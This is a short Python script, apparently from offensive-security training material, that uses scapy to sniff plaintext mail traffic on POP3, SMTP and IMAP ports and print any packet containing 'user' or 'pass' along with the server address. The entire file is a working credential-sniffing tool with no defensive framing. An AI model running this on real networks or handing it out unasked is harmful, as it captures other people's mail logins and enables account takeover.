from scapy.all import *

def callback(packet):
    if packet[TCP].payload:
        mail_packet = str(packet[TCP].payload)
        if "user" in mail_packet.lower() or "pass" in mail_packet.lower():
            print(f"[+] Server: {packet[IP].dst}")
            print(f"[+] {packet[TCP].payload}")
sniff(filter="tcp port 110 or tcp port 25 or tcp port 143", prn=callback, store=0)